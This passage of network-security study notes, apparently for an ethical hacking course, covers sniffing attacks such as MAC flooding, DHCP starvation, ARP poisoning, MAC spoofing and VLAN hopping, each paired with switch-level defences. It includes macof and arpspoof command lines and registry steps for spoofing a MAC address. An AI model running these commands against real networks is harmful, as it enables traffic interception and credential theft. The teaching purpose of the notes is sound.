			- Active Sniffing Techniques:
				- MAC Flooding
				- DNS Poisoning
				- ARP Poisoning
				- DHCP Attacks
				- Switch Port Stealing
				- Spoofing Attack
	- Protocols Vulnerable to Sniffing:
		- Telnet and Rlogin : Telnet is a protocol that allows communication with a remote host via port 23 using a command-line terminal. Rlogin enables remote login to a network machine through a TCP connection. Neither protocol provides encryption, meaning data transmitted between clients is in plaintext and vulnerable to sniffing. Attackers can intercept keystrokes, including usernames and passwords.
		- HTTP : The default version of HTTP has vulnerabilities that cause websites to transmit user data in plaintext across the network, making it susceptible to interception by attackers who can steal user credentials.
		- SNMP : Simple Network Management Protocol (SNMP) is a TCP/IP-based protocol used to exchange management information between network devices. The first versions of SNMP (SNMPv1 and SNMPv2) lack strong security, causing data to be transmitted in plaintext. Attackers exploit these vulnerabilities to capture passwords in cleartext.
		- SMTP : Simple Mail Transfer Protocol (SMTP) is used to transmit email messages over the Internet. In most implementations, SMTP transmits messages in plaintext, allowing attackers to intercept and capture plaintext passwords. Furthermore, SMTP lacks built-in protection against sniffing attacks.
		- NNTP : Network News Transfer Protocol (NNTP) is used for distributing, retrieving, posting, and inquiring about news articles over a reliable stream-based transmission within the ARPA-Internet community. However, NNTP does not encrypt data, making it vulnerable to attackers who can sniff and capture sensitive information.
		- POP : Post Office Protocol (POP) enables a user’s workstation to retrieve email from a mailbox server. Outgoing mail is typically sent from the workstation to the mailbox server via SMTP. However, due to weak security implementations, POP transmits data in plaintext, making it easy for attackers to sniff and capture sensitive information.
		- FTP : File Transfer Protocol (FTP) allows clients to share files between computers on a network. However, FTP lacks encryption, making it vulnerable to sniffing attacks. Attackers can intercept and capture data, including user credentials, using tools such as Hashcat.
		- IMAP : Internet Message Access Protocol (IMAP) enables clients to access and manage email messages stored on a server. However, due to inadequate security measures, IMAP transmits data in plaintext, allowing attackers to intercept and capture sensitive information, including user credentials.
		- TFTP : Trivial File Transfer Protocol (TFTP) is a simple file transfer protocol implemented over UDP/IP. It lacks authentication and encryption mechanisms, making transferred data easily accessible to anyone on the same network.
	- Sniffing in the Data Link Layer of the OSI Model:
		- The OSI model organizes network functions into seven layers, with each layer providing services to the layer above and receiving services from the layer below. The data link layer, the second layer of the OSI model, is responsible for encoding and decoding data packets into bits. Sniffers operate at this layer, allowing them to capture packets directly from it. Because the OSI layers are designed to function independently, sniffing at the data link layer goes undetected by the upper layers.
	- Hardware Protocol Analyzers:
		- A hardware protocol analyzer is a device designed to interpret and monitor network traffic by capturing signals without altering the traffic segment. Its primary purpose is to track network usage and identify malicious traffic generated by hacking software. The analyzer captures data packets, decodes them, and analyzes their content based on predefined rules, enabling attackers to view individual data bytes of each packet traversing the network.
		- Unlike software protocol analyzers, hardware analyzers can handle higher data loads without dropping packets, even during data overload. They support a wide range of network connections, including LAN, WAN, wireless, and circuit-based telco lines. Hardware analyzers can also display bus states and low-level events such as high-speed negotiation (e.g., K/J chirps), transmission errors, and retransmissions, while providing precise timestamps for captured traffic. Despite their advanced capabilities, hardware protocol analyzers are expensive, making them less accessible to individual developers, hobbyists, and ordinary hackers.
		- Hardware Protocol Analyzers (manufacturers):
			- Xgig 1000 32/128 G FC & 25/50/100 GE Analyzer:
				- The VIAVI Xgig 1000 32/128 G Fiber Channel (FC) and 25/50/100 G Ethernet (GE) platform is a hardware solution that supports 8G/16G/32G/128G FC and 10/25/50/100 GE in a portable, integrated platform with reconfigurable ports. It provides a platform for inline, non-intrusive capture and analysis, as well as inline jamming (error injection).
				- The platform incorporates the industry's first true analog pass-through adapter, maintaining the linear nature of signal-over-copper connections. It offers exceptional visibility into the OSI physical layer with features such as auto-negotiation, link training, and forward error correction (FEC).
			- SierraNet M1288:
				- The SierraNet M1288 is an Ethernet and Fiber Channel test platform that provides best-in-class analysis, jamming, and generation capabilities for capturing and manipulating traffic to test application and link characteristics. This hardware tool can capture and analyze up to 256GB of Ethernet or Fiber Channel traffic at full wire transmission rates.
				- Key features of the SierraNet M1288 include 128GB or 256GB recording buffers, dynamic memory allocation, support for Fiber Channel fabrics (64/128GFC PAM4), and compatibility with 1, 2, and 4 Ethernet lanes.
			- Hardware Protocol Analyzers:
				- PTW60 (www.globalspec.com)
				- P5551A PCIe 5.0 Protocol Exerciser (www.keysight.com)
				- Voyager M4x (www.teledynelecroy.com)
				- N2X N5540A Agilent Protocol Analyzer (www.valuetronics.com)
				- Xgig 16-Lane PCI Express 4.0 Chassis (www.viavisolutions.com)
	- SPAN Port:
		- The Switched Port Analyzer (SPAN) is a Cisco switch feature, also known as "port mirroring," that monitors network traffic on one or more switch ports. A SPAN port is configured to receive copies of every packet that passes through the switch. It helps analyze and debug data, identify errors, and investigate unauthorized network access.
		- When port mirroring is enabled, the network switch sends a copy of packets from the source port(s) to the destination port, where a network analyzer examines them. While there can be multiple source ports, there must be only one destination port. Source ports are those from which network packets are monitored and mirrored. This feature allows simultaneous monitoring of traffic from multiple ports, such as all ports in a specific virtual local area network (VLAN).
	- Wiretapping:
		- Wiretapping, or telephone tapping, refers to the monitoring of telephone or Internet conversations by a third party with covert intentions. To carry out wiretapping, the attacker first selects a target individual or network host on the network to wiretap and then connects a listening device (hardware, software, or a combination of both) to the circuit carrying information between the target phones or hosts.
		- Typically, this involves intercepting a small portion of the electrical signals transmitted through telephone wires to eavesdrop on the conversation. This allows attackers to monitor, intercept, access, and record information flowing through the communication system.
		- Wiretapping without a warrant or the consent of the individuals involved in the conversation is a criminal offense in most countries and is punishable according to the laws of the respective country.
		- Wiretapping Methods:
			- Official tapping of telephone lines
			- Unofficial tapping of telephone lines
			- Recording conversations
			- Direct line wiretap
			- Radio wiretap
		- Types of Wiretapping:
			- Active Wiretapping: In hacking terminology, active wiretapping is a Man-in-the-Middle (MITM) attack. It allows an attacker to monitor and record the traffic or data flow in a communication system. The attacker can also alter or inject data into the communication or traffic.
			- Passive Wiretapping: Passive wiretapping refers to snooping or eavesdropping. It allows an attacker to monitor and record traffic. By observing the recorded traffic, the attacker can search for passwords or other sensitive information.
	- Lawful Interception:
		- Lawful interception (LI) refers to the legal interception of data communication between two endpoints for surveillance purposes on traditional telecommunications, VoIP, data, and multiservice networks. LI involves obtaining data from a communication network for analysis or use as evidence.
		- It is commonly used in activities such as infrastructure management, protection, and addressing cybersecurity-related issues. In this process, the network operator or service provider grants legal access to private network data, enabling the monitoring of private communications, such as telephone calls and email messages. These operations are conducted by law enforcement agencies (LEAs).
		- This type of interception is necessary solely for monitoring messages exchanged over suspicious channels where users are engaged in illegal activities. Countries worldwide are making efforts to standardize procedures for such interception.
		- The solution comprises a tap/access switch and multiple systems for reconstructing intercepted data. The tap/access switch collects traffic from the Internet service provider (ISP) network, sorts it by IP domain, and forwards it to E-Detective (ED) systems. These systems decode and reconstruct the intercepted traffic into its original format. This process is supported by protocols such as POP3, IMAP, SMTP, P2P, FTP, and Telnet. A Centralized Management Server (CMS) oversees all ED systems.
	- Sniffing Techniques:
		- MAC Flooding:
			- Attackers use the MAC flooding technique to force a switch to function as a hub, allowing them to easily sniff the traffic.
			- MAC Address/CAM Table:
				- In a switched network, an Ethernet switch has a fixed-size dynamic Content Addressable Memory (CAM) table, which stores information such as MAC addresses associated with physical ports and their corresponding virtual LAN (VLAN) parameters.
				- A switch acts as an intermediate device between one or more computers in a network. When a machine sends data to another machine within a network, the data passes through the switch. The switch searches its CAM table for the destination MAC address (found in the Ethernet frame). Once the MAC address is located, the switch forwards the data to the machine through the port associated with that MAC address.
				- This method of data transfer in a switched network is more secure than in a hub-based network, where the hub forwards/broadcasts incoming traffic to all machines in the network.
			- The CAM table on a switch has a limited size. When the CAM table reaches its capacity, any additional ARP request traffic is flooded to all ports on the switch. If the CAM table is flooded with more MAC addresses than it can store, the switch turns into a hub. This enables an attacker to intercept frames sent between a victim host and another host without a corresponding CAM table entry. Once this occurs, the switch broadcasts all incoming traffic to every port, similar to a hub, to ensure data delivery to the intended recipient. This attack also fills the CAM tables of adjacent switches.
			- Attackers exploit this vulnerability through MAC flooding, which involves sending a large volume of fake source MAC address and IP pairs to the switch, causing the CAM table to overflow. An attacker with access to the shared switch within the Ethernet segment can then easily intercept and analyze network traffic.
			- No issues occur until the MAC address table is full. However, once the MAC address table is full, any further requests may force the switch to enter fail-open mode. In the fail-open mode, the switch begins functioning like a hub. The attacker can then configure the machine’s NIC to promiscuous mode to enable the machine to accept and process all the traffic. This enables the attackers to sniff the traffic easily and steal sensitive information.
			- Switch MAC Flooding with macof:
				- macof is a Unix/Linux tool included in the dsniff collection. It floods the local network with random MAC and IP addresses, causing certain switches to fail and enter repeating (fail-open) mode, which facilitates traffic sniffing. The tool overwhelms the switch’s CAM tables by sending forged MAC entries at a rate of approximately 131,000 per minute. Once the MAC table is full and the switch switches to hub-like behavior, an attacker can intercept and monitor the broadcasted data.
				- macof -i eth0 -n 10
			- Switch Port Stealing:
				- The switch port stealing sniffing technique uses MAC flooding to intercept packets. The attacker floods the switch with forged gratuitous ARP packets, using the target MAC address as the source and the attacker’s own MAC address as the destination. This causes a race condition between the attacker’s flooded packets and the target host’s packets, forcing the switch to constantly update its MAC address table, binding the target MAC address to multiple ports.
				- If the attacker acts quickly, they can redirect packets intended for the target host to their own switch port. At this point, the attacker "steals" the target host's switch port and sends an ARP request to discover the target host’s IP address. When the attacker receives an ARP reply, it indicates that the target host’s switch port binding has been restored, and the attacker can now sniff the packets sent to the targeted host.
			- Defending Against MAC Attacks:
				- Defending Against MAC Attacks with Port Security:
					- Port security limits MAC address access to a switch port. By assigning secure MAC addresses to a port, only packets with matching source MAC addresses are allowed. - A security violation occurs if:
						- The maximum number of secure MAC addresses is reached
						- A machine tries to access the port with an unrecognized MAC address
					- Secure MAC addresses can be configured in three ways:
						- Manually via the switch port configuration
						- Dynamically, based on connected devices’ MAC addresses
						- A mix of static and dynamic configurations
					- Port security helps prevent MAC flooding attacks by limiting the number of allowed MAC addresses and locking down the port, sending an SNMP trap when a violation occurs.
				- Configuring Port Security on Cisco Switch:
					- interface interface_id : Enter interface configuration mode and select the physical interface to configure (e.g., gigabitethernet 3/1).
					- switchport mode access : Set the interface mode to access. By default, an interface in dynamic desirable mode cannot be configured as a secure port.
					- switchport port-security : Enable port security on the selected interface.
					- switchport port-security maximum {1-3072} : Sets the maximum number of secure MAC addresses allowed on the interface. The range is 1 to 3072, with a default of 1.
					- switchport port-security violation {restrict | shutdown} : Configures the violation mode, specifying the action to be taken when a security violation is detected. Options are {restrict | shutdown}.
					- switchport port-security limit rate invalid-source-mac : Sets the rate limit for invalid packets (those with unauthorized MAC addresses).
					- switchport port-security mac-address mac_address : Manually enters a secure MAC address for the interface. This can be used to limit the number of secure MAC addresses.
					- switchport port-security mac-address sticky : Enables sticky learning for the first MAC address on the interface, allowing it to be added dynamically to the secure MAC address table.
					- end : Exits interface configuration mode and returns to privileged EXEC mode.
					- show port-security address / show port-security address interface interface_id : Verifies the port security configuration and displays the secure MAC addresses associated with the interface.
					- switchport port-security aging time 2 : Configures the aging time for secure MAC addresses on the port.
					- switchport port-security aging type inactivity : Sets the secure MAC address aging type to "inactivity," meaning the address will be aged out if inactive.
					- snmp-server enable traps port-security trap-rate 5 : Controls the rate at which SNMP traps are generated for port security events.
		- DHCP Attack:
			- Dynamic Host Configuration Protocol (DHCP):
				- DHCP enables communication on an IP network by automatically configuring network devices. It assigns IP addresses and other information to devices, enabling them to communicate on the network in a client-server model.
				- DHCP serves two primary functions: delivering host-specific configuration parameters and allocating network addresses to hosts. Communication between DHCP servers and clients is carried out through a series of DHCP messages.
				- DHCP is a client-server protocol that automatically assigns an IP address to an IP host. In addition to the IP address, the DHCP server provides configuration information, such as the default gateway and subnet mask.
				- When a DHCP client device boots up, it initiates communication by broadcasting traffic to discover available DHCP servers on the network. This process allows DHCP to dynamically assign IP configurations to hosts connecting to a network, streamlining the administrative task of managing IP networks.
				- DHCP servers maintain TCP/IP configuration information in a database, which includes valid TCP/IP configuration parameters, available IP addresses, and the lease durations offered by the server. The server provides address configurations to DHCP-enabled clients in the form of lease offers.
			- DHCP Starvation Attack:
				- In a DHCP starvation attack, an attacker floods the DHCP server with numerous DHCP requests, exhausting all the available IP addresses that the server can allocate. As a result, the server becomes unable to issue additional IP addresses, leading to a DoS attack. Consequently, legitimate users are unable to obtain or renew their IP addresses and fail to access the network. The attacker achieves this by broadcasting DHCP requests with spoofed MAC addresses, using tools such as Yersinia, Hyenae, and Gobbler.
				- DHCP starvation attack tools send a large number of requests to a DHCP server, leading to exhaustion of the server’s address pool. Subsequently, the DHCP server is unable to allocate configurations to new clients.
				- DHCP Starvation Attack Tools:
					- Yersinia : Yersinia is a network tool designed to exploit vulnerabilities in various network protocols, such as DHCP. It serves as a robust framework for analyzing and testing deployed networks and systems.			
					- dhcpStarvation.py (github.com)
					- Metasploit (www.metasploit.com)
					- Hyenae (sourceforge.net)
					- DHCPig (github.com)
			- Rogue DHCP Server Attack:
				- This attack works alongside a DHCP starvation attack. After exhausting the DHCP server’s IP address pool, an attacker sets up a rogue DHCP server on the network, impersonating a legitimate server. The rogue server assigns IP addresses and network information to clients, acting as the default gateway. Clients receiving configurations from the rogue server become vulnerable to attacks such as MITM, as their traffic is routed through the attacker’s server.
				- The rogue DHCP server competes with the legitimate DHCP server to respond to clients’ discovery requests. If the rogue server responds faster, the client accepts its response, potentially disrupting network access or causing a DoS attack. The rogue server can capture and forward client traffic, making the attack difficult to detect. Additionally, it can direct clients to fake websites to steal credentials.
				- To mitigate rogue DHCP server attacks, designate interfaces connected to unauthorized servers as untrusted. This blocks all incoming DHCP server messages from such interfaces, preventing malicious configurations.
				- DHCP Attack Tools:
					- mitm6 (github.com)
					- Ettercap (www.ettercap-project.org)
					- Gobbler (sourceforge.net)
			- Defend Against DHCP Starvation and Rogue Server Attacks:
				- Defend Against DHCP Starvation:
					- Enable port security to protect against DHCP starvation attacks. Port security limits the maximum number of MAC addresses allowed on a switch port. When this limit is exceeded, the switch drops subsequent packets from additional MAC addresses, safeguarding the server from DHCP starvation attacks.
					- IOS Switch Commands: The Internetwork Operating System (IOS) provides a comprehensive set of switch commands used to configure, manage, and troubleshoot Cisco network switches effectively.
				- Defend Against Rogue Server Attack:
					- The DHCP snooping feature available on switches helps mitigate rogue DHCP servers. It is configured on the port where the valid DHCP server is connected. Once configured, DHCP snooping prevents other ports on the switch from responding to DHCP Discover packets sent by clients. As a result, even if an attacker manages to set up a rogue DHCP server and connects it to the switch, it will not be able to respond to DHCP Discover packets.
					- IOS Global Commands: IOS Global Commands are a set of commands that can be configured at the global level in Cisco devices; can be used to defend against rogue server attacks by configuring security features, such as DHCP snooping and port security, to prevent unauthorized servers from responding to client requests and compromising the network.
					- MAC Limiting Configuration on Juniper Switches: MAC Limiting Configuration on Juniper switches is a security feature that restricts the number of MAC addresses learned on a port, preventing unauthorized devices from connecting and protecting the network from MAC flooding attacks and unauthorized access.
					- Configuring DHCP Filtering on Switch: DHCP filtering allows administrators to control whether traffic is forwarded between trusted nodes. When DHCP filtering is applied, the switch verifies the legitimacy of DHCP packets/messages before forwarding them to the client. With this filtering, the client can receive the correct port number and IP address from the legitimate DHCP server.
		- ARP Poisoning:
			- Address Resolution Protocol (ARP):
				- The ARP is a stateless TCP/IP protocol that maps IP addresses to hardware addresses (MAC addresses) used by a data link protocol. It resolves IP addresses to MAC addresses to enable communication within a network. In addition to switches, host machines also use ARP to obtain MAC addresses.
				- A host machine uses ARP when it needs to send a packet to another device. The host must specify the destination MAC address in the packet. The operating system maintains an ARP table, which is populated with information from responses to ARP requests. This table maps IP addresses to their corresponding MAC addresses, facilitating efficient communication within the network.
				- The process of obtaining a MAC address using ARP begins with the source machine sending an ARP request containing its own MAC and IP addresses along with the destination IP address to the switch. The switch updates its CAM table with the source MAC and port; if the MAC address is not already in the table, it adds the entry and broadcasts the ARP request to the network. Each device on the network compares the destination IP in the request with its own IP address. The device with the matching IP sends an ARP reply back to the switch, which updates its CAM table with the responder's MAC and forwards the reply to the source machine. The source then updates its ARP table with the responder's MAC address, enabling communication between the devices.
			- ARP Spoofing Attack:
				- ARP spoofing is a method used to attack an Ethernet LAN. ARP resolves IP addresses to MAC (hardware) addresses of interfaces to enable data transmission. However, ARP packets can be forged to redirect data to an attacker’s machine. ARP spoofing involves constructing a large number of forged ARP request and reply packets to overload a switch.
				- When a machine sends an ARP request, it assumes the ARP reply comes from the correct device. However, ARP lacks any mechanism to verify the authenticity of the responding device. Even systems that have not sent an ARP request can accept unsolicited ARP replies from other devices. Attackers exploit this flaw by crafting malformed ARP replies containing spoofed IP and MAC addresses. Assuming the reply is legitimate, the victim's computer adds the spoofed entry to its ARP table.
				- Once the ARP table is populated with these spoofed entries, the switch enters forwarding mode, allowing the attacker to intercept all data flowing from the victim's machine without their awareness. This technique is also referred to as ARP cache poisoning.
				- ARP spoofing serves as a precursor for attacks such as DoS, MITM, and session hijacking. When a legitimate user initiates a session with another user within the same Layer 2 broadcast domain, the switch broadcasts an ARP request using the recipient's IP address. The sender waits for the recipient to respond with a MAC address. An attacker listening on this unprotected Layer 2 broadcast domain can intercept the request and reply by spoofing the intended recipient’s IP address.
				- The attacker may also run a packet sniffer and configure the machine’s NIC to promiscuous mode, enabling them to capture all network traffic.
			- Threats of ARP Poisoning:
				- Packet Sniffing: Capturing and analyzing network traffic, often to extract sensitive information.
				- Session Hijacking: Stealing valid session information to gain unauthorized access to an application.
				- VoIP Call Tapping: Exploiting port mirroring to monitor all network traffic and selectively record VoIP traffic based on MAC addresses.
				- Manipulating Data: ARP spoofing enables attackers to capture and modify data or disrupt the flow of traffic.
				- Man-in-the-Middle (MITM) Attack: The attacker positions themselves between the victim and the server to intercept and potentially alter communication.
				- Data Interception: Captures IP addresses, MAC addresses, and VLAN information connected to a network switch.
				- Connection Hijacking: Exploits the flexibility of hardware addresses, which are meant to be unique and fixed. If a host changes its hostname or protocol, an attacker can manipulate the connection, taking complete control of a client’s session.
				- Connection Resetting: Incorrect routing information caused by hardware or software errors can disrupt connections. If a host fails to initiate a connection, it should inform the Address Resolution module to delete its entry. Data reception from the host will reset the connection timeout in the ARP table. If the host remains inactive for a certain period, the ARP entry is deleted automatically.
				- Stealing Passwords: Attackers use forged ARP replies to trick target hosts into sending sensitive information, such as usernames and passwords.
				- DoS Attack: Attackers associate multiple IP addresses with a single MAC address of the target host, overwhelming it with traffic and causing service disruptions.
			- ARP Spoofing/ Poisoning Tools:
				- arpspoof:
					- arpspoof redirects packets from a target host (or all hosts) on a LAN that are intended for another host by forging ARP replies. This tool is highly effective for sniffing traffic on a switched network.
					- arpspoof –i [Interface] –t [Target Host]
				- Habu:
					- Habu is a versatile hacking toolkit that offers various commands to perform a wide range of attacks and analyses. Its capabilities include ARP poisoning and traffic sniffing, DHCP discovery and starvation, subdomain identification, certificate cloning, TCP analysis (including ISN and flags), username verification on social networks, and web technology identification.
				- bettercap (github.com)
				- Ettercap (www.ettercap-project.org)
				- RITM (github.com)
				- ARP Spoofer (github.com)
				- larp (github.com)
			- Defend Against ARP Poisoning:
				- Implement Dynamic ARP Inspection Using DHCP Snooping Binding Table:
					- Dynamic ARP Inspection (DAI) prevents ARP poisoning by validating ARP packets in a network. When enabled on a VLAN, all ports are untrusted by default, and DAI uses the DHCP snooping binding table to verify MAC-IP bindings. DHCP snooping must be activated first, as it collects MAC addresses, IP addresses, and VLAN interfaces by monitoring DHCP exchanges. Without it, ARP-based communication between VLAN devices may fail, potentially causing a self-imposed DoS.
					- DAI inspects ARP packets against the snooping database and discards those with invalid bindings, reducing MITM attack risks. For networks with static IPs or switches without DAI, static mapping of IP-MAC pairs can be used to mitigate attacks. Custom scripts can also monitor ARP tables, comparing current entries against known MAC-IP pairs to detect mismatches and drop malicious packets. These methods safeguard servers and gateways from ARP poisoning.
				- Configuring DHCP Snooping and Dynamic ARP Inspection on Cisco Switches:
					- Dynamic ARP Inspection (DAI) requires DHCP snooping to be enabled first. DHCP snooping is a security feature that builds a binding table by tracking IP-to-switch-port mappings and filters untrusted DHCP messages. It inspects DHCP traffic at the Layer 2 level, ensuring secure IP allocation.
					- To configure DHCP snooping, enable it both globally and for the desired VLANs. Once DHCP snooping is active, DAI can be configured to validate ARP packets and prevent ARP poisoning attacks.
			- ARP Spoofing Detection Tools:
				- Capsa Portable Network Analyzer : Capsa, a portable network performance analysis and diagnostics tool, offers packet capture and analysis capabilities through an intuitive interface. It enables efficient network monitoring and protection in critical business environments. Capsa assists security professionals in swiftly detecting ARP poisoning and ARP flooding attacks and identifying their sources.
				- Wireshark (www.wireshark.org)
				- OpUtils (www.manageengine.com)
				- netspionage (github.com)
				- NetProbe (github.com)
				- ARP-GUARD (arp-guard.com)
		- MAC Spoofing/Duplicating:
			- MAC Spoofing/duplicating refers to the spoofing a MAC address with the MAC address of a legitimate user on the network. A MAC duplicating attack involves monitoring a network for the MAC addresses of legitimate clients that are connected. A MAC duplicating attack is launched by sniffing the network for the MAC addresses of clients actively associated with a switch port and then reusing one of those addresses. By intercepting the traffic on the network, a malicious user can spoof a legitimate user’s MAC address and receive all traffic intended for that user.
			- In this attack, the attacker first identifies the MAC addresses of clients that are actively connected to a switch port. The attacker then spoofs one of those MAC addresses, impersonating the legitimate client. If the spoofing is successful, the attacker can intercept all traffic destined for the legitimate client. As a result, the attacker gains unauthorized access to the network and can impersonate someone else. This technique may also be used to bypass MAC filtering on wireless access points.
			- MAC Spoofing Technique (Windows):
				- Method 1: Changing the MAC Address Using the Network Interface Card's Clone MAC Address Feature
					- If network interface card supports cloning the MAC address, follow these steps:
					- Open Control Panel: Go to Network and Sharing Center under Network and Internet
					- Access Ethernet Properties: Click Ethernet connection -> Properties -> Configure
					- Set the MAC Address: In the Advanced tab, select Network Address, enter the new MAC address without colons (e.g., 001A2B3C4D5E), and click OK
					- Verify Changes: Use ipconfig/all or net config rdr in Command Prompt
					- Reboot if Needed: Restart system if changes are visible; otherwise, try Method 2 (registry)
				- Method 2: Change MAC Address in the Registry
					- Open Registry Editor: Press Win + R, type regedit, and hit Enter
					- Navigate to Key: Go to HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}
					- Find the Adapter: Look for subkeys (0000, 0001, etc.) and check DriverDesc to identify the correct adapter
					- Add NetworkAddress: Right-click the subkey -> New -> String Value, name it NetworkAddress, and modify it to enter the new MAC address (e.g., 001A2B3C4D5E)
					- Apply Changes: Disable and re-enable the adapter or reboot the system
			- MAC Spoofing Tools:
				- MAC Address Changer : MAC Address Changer is a lightweight application that allows users to change or spoof the MAC address of network adapters. It is often utilized in network-related activities, including testing network security or simulating different devices. The tool can generate a randomized MAC address and restore the original address when needed.
				- SMAC (smac-tool.com)
				- Technitium MAC Address Changer (TMAC) (technitium.com)
				- Change MAC Address (lizardsystems.com)
				- Mac Changer (github.com)
				- Automatic Media Access Control Address Spoofing Tool (AMC) (github.com)
			- Defend Against MAC Spoofing:
				- DHCP Snooping Binding Table: DHCP snooping filters untrusted DHCP messages and builds a DHCP binding table. This table includes MAC addresses, IP addresses, lease times, binding types, VLAN numbers, and interface information, corresponding to untrusted switch interfaces. It acts as a firewall between untrusted hosts and DHCP servers, helping to differentiate between trusted and untrusted interfaces.
				- Dynamic ARP Inspection (DAI): This system checks the IP–MAC address binding for each ARP packet. During DAI, the system automatically drops packets with invalid IP–MAC address bindings.
				- IP Source Guard: IP Source Guard restricts IP traffic on untrusted Layer 2 ports by filtering traffic based on the DHCP snooping binding database. It prevents spoofing attacks when an attacker attempts to spoof or use another host's IP address.
				- Encryption: Encrypt communications between access points and devices to prevent MAC spoofing. Use secure encryption protocols like WPA3 to protect against MAC address spoofing, which can occur through traffic interception and manipulation.
				- Retrieving MAC Address: Always retrieve the MAC address directly from the Network Interface Card (NIC), rather than from the operating system.
				- IEEE 802.1X Implementation: This network protocol enforces port-based Network Access Control (PNAC), controlling access to the network at the entry point where users join.
				- AAA (Authentication, Authorization, and Accounting): Implement AAA servers to filter MAC addresses, ensuring secure authentication and monitoring.
				- Network Access Control (NAC): NAC systems enforce security policies on devices attempting to access the network. It can detect and prevent unauthorized access due to MAC spoofing.
				- Rate Limiting and Traffic Analysis: Implement rate limiting on network devices to mitigate the effects of MAC flooding attacks.
				- Regular Network Audits and Security Assessments: Conduct regular network audits to identify unknown devices, unexpected traffic patterns, and non-compliance with security policies. This helps identify potential vulnerabilities before they can be exploited.
				- Port Security: Configure port security on switches to limit the number of allowed MAC addresses per port and specify permitted MAC addresses, enhancing security.
		- IRDP Spoofing:
			- ICMP Router Discovery Protocol (IRDP) is a routing protocol that enables a host to discover the IP addresses of active routers on its subnet by processing router advertisement and solicitation messages. Attackers can exploit this protocol to remotely add default route entries on a system by spoofing router advertisement messages.
			- Since IRDP does not require authentication, the target host prioritizes the attacker-defined default route over the one provided by the DHCP server. Attackers achieve this by setting a high preference level and route lifetime, ensuring that the target host selects it as the preferred route.
			- This attack is only possible if the attacker is on the same network as the victim. On Windows systems configured as DHCP clients, the OS validates received router advertisements. If only one entry is present, Windows checks whether the source IP is within the subnet. If it is, the default route is added; otherwise, the advertisement is ignored.
			- By sending spoofed IRDP router advertisements, attackers can redirect all data packets through their system. This enables them to sniff traffic and extract sensitive information.
			- IRDP spoofing can facilitate various attacks:
				- Passive Sniffing: In switched networks, attackers reroute outbound traffic from target hosts through their machine, enabling traffic interception.
				- MITM (Man-in-the-Middle): Attackers intercept and act as a proxy between victims and destinations, potentially modifying traffic.
				- DoS (Denial of Service): Attackers add incorrect route entries to the victim’s routing table, disrupting network communication.
			- To prevent IRDP spoofing attacks, disable IRDP on hosts if the operating system supports/allows it.
		- VLAN Hopping:
			- VLAN hopping is a network attack technique used to gain unauthorized access to resources on a Virtual Local Area Network (VLAN). The goal of a VLAN hopping attack is to access traffic from other VLANs within the same network, which is otherwise inaccessible. Such attacks often exploit poor VLAN implementations or misconfigurations.
			- This attack bypasses network segmentation controls designed to isolate traffic for security and management purposes. Attackers use VLAN hopping to steal sensitive information (e.g., passwords), modify, corrupt, or delete data, install malicious code or programs, or spread malware such as viruses, Trojans, and worms throughout the network.
			- VLAN Hopping Methods:
				- Switch Spoofing:
					- Switch Spoofing is an attack where an attacker connects a rogue switch to the network, tricking a legitimate switch into creating a trunk link between them. Once the trunk link is established, traffic from multiple VLANs can be sent through the rogue switch, enabling the attacker to sniff and view the packet content.
					- This attack is successful only if the legitimate switch is configured to negotiate trunk connections or if its interface is set to modes like “dynamic auto,” “dynamic desirable,” or “trunk.”
				- Double Tagging:
					- Double Tagging is an attack where an attacker adds and manipulates tags in an Ethernet frame to enable traffic flow through any VLAN in the network. The attacker sends an Ethernet frame containing two 802.1Q tags: an outer tag corresponding to the attacker’s native VLAN and an inner tag for the target VLAN the attacker wants to access.
					- When the switch receives the frame, it removes the outer tag (as it matches the native VLAN) and forwards the frame with the inner tag intact to all trunk interfaces. This allows the attacker to bypass VLAN segmentation, jumping from their native VLAN to the target VLAN and sending traffic to other VLANs.
					- This attack is only possible if the switch ports are configured to use native VLANs.
			- Defend Against VLAN Hopping:
				- Configuring a Switch to Prevent Switch Spoofing Attacks:
					- Explicitly configure the ports as access ports and ensure that they are set not to negotiate trunks.
					- Ensure that all trunk ports are explicitly configured to prevent trunk negotiation.
				- Configuring a Switch to Prevent Double Tagging Attacks:
					- Specify a default VLAN to be used if an interface stops trunking.
					- Change the native VLANs on all trunk ports to an unused VLAN ID.
					- Explicitly tag the native VLANs on all trunk ports.
					- Use Private VLANs: Configure private VLANs to isolate ports within the same VLAN from each other.
					- Regularly Audit and Monitor VLAN Configurations: Perform regular audits of VLAN and switch configurations to ensure compliance with security policies.
		- STP Attack:
			- In a Spanning Tree Protocol (STP) attack, attackers connect a rogue switch to the network to change the STP operation and sniff all network traffic. STP is used in LAN-switched networks to prevent network loops and ensure optimized traffic paths, enhancing overall network performance. In this process, one switch is designated as the root bridge, and other switches select a root port, the port closest to the root bridge.
			- The root bridge is selected using Bridge Protocol Data Units (BPDUs), which include an identification number known as a Bridge ID (BID). The BID is composed of a Bridge Priority and the MAC address. By default, the Bridge Priority value is 32769.
			- If an attacker gains access to two switches, they can configure the rogue switch to have a lower priority than any other switch in the network, making it the root bridge. This allows the attacker to intercept and sniff all network traffic.
			- Defend Against STP Attacks:
				- To Prevent an STP Attack, the Following Security Features Should Be Implemented:
				- BPDU Guard : Enable BPDU guard on ports that should never receive a BPDU from connected devices. This feature prevents the transmission of BPDUs on PortFast-enabled ports, helping avoid potential bridging loops in the network. If BPDU guard is enabled on a switch interface and an unauthorized switch sends a BPDU, the port will enter errdisable mode, shutting it down and disabling it from sending or receiving traffic.
				- Root Guard : Root guard protects the root bridge by ensuring it remains as the root in the STP topology. It forces interfaces to become designated ports (forwarding ports) to prevent nearby switches from becoming the root switch. If a port with root guard enabled receives a superior BPDU, it moves into a "loop inconsistent" state (not errdisabled), thus preventing an STP topology change. The port remains down only for the specific switch or switches attempting to change the STP topology, and stays down until the issue is resolved.
				- Loop Guard : Loop guard enhances network stability by preventing bridging loops, often protecting against malfunctioning switches.
				- UDLD (Unidirectional Link Detection) : UDLD detects unidirectional links and disables the affected interfaces in the network. These unidirectional links can cause STP topology loops.
				- Deploy PortFast : Apply PortFast to all access ports to reduce the time spent in the listening and learning STP states. However, ensure BPDU Guard is enabled to mitigate risks.
				- Regularly Update and Patch Network Devices : Keep the firmware and software of network devices up to date to protect against known vulnerabilities.
				- Restrict Network Access : Limit physical access to network ports and devices to prevent unauthorized STP configuration changes.
				- Network Segmentation : Reduce the scope of STP attacks by dividing larger broadcast domains into smaller, more manageable segments.
		- DNS Poisoning:
